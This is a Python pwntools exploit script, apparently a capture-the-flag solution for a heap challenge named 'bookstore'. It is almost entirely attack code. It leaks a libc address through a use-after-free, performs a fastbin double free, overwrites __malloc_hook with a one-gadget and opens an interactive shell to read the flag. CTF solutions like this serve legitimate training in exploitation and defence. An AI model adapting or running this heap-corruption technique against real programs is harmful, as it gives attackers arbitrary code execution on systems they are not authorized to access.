#!/usr/bin/env python3

from pwn import *
import os

# io = process("./bookstore")
path = os.path.dirname(os.path.abspath(__file__))
io = remote("127.0.0.1", 1337)
libc = ELF(f"{path}/../Challenge/Public/libc-2.23.so")


def menu():
    io.recvuntil(b"Exit\n")


def malloc(pos, size):
    menu()
    io.sendline(b"1")
    io.recvuntil(b"[0-10]\n")
    io.sendline(str(pos))
    io.recvuntil(b"[# characters]\n")
    io.sendline(str(size))


def edit(num, payload):
    menu()
    io.sendline(b"2")
    io.recvuntil(b"[0-10]\n")
    io.sendline(str(num))
    io.recvuntil(b"description\n")
    io.sendline(payload)


def view(num):
    menu()
    io.sendline(b"3")
    io.recvuntil(b"[0-10]\n")
    io.sendline(str(num))


def free(num):
    menu()
    io.sendline(b"4")
    io.recvuntil(b"[0-10]\n")
    io.sendline(str(num))


# Step 1: Leak libc address
malloc(0, 0x79)
malloc(1, 0x79)

free(0)
view(0)
libc.address = (
    u64(io.recv(6).ljust(8, b"\0")) - 0x3C4B78
)  # Offset known by testing once locally and looking at the vmmap for the libc base
log.info(f"libc base: {hex(libc.address)}")
free(1)

# Step 2: Fastbin dup / Double free
malloc(0, 0x61)
malloc(1, 0x61)

free(0)
free(1)
free(0)

# Step 3: Point next chunk to be allocated before the malloc hook
hook = libc.symbols["__malloc_hook"] - 0x23
edit(0, p64(hook))

malloc(3, 0x61)
malloc(4, 0x61)

# Step 4: Overwrite malloc hook with a onegadget
one_gadget = (
    libc.address + 0xF1117
)  # Find offset with a tool to find one gadgets in the provided libc
log.info(f"one gadget: {hex(one_gadget)}")

edit(4, b"A" * 0x13 + p64(one_gadget))

# Step 5: Malloc one last time to trigger the onegadget
malloc(5, 0x61)

# Step 6: Collect the flag & have a great day
# io.sendline("cat flag.txt")

io.interactive()
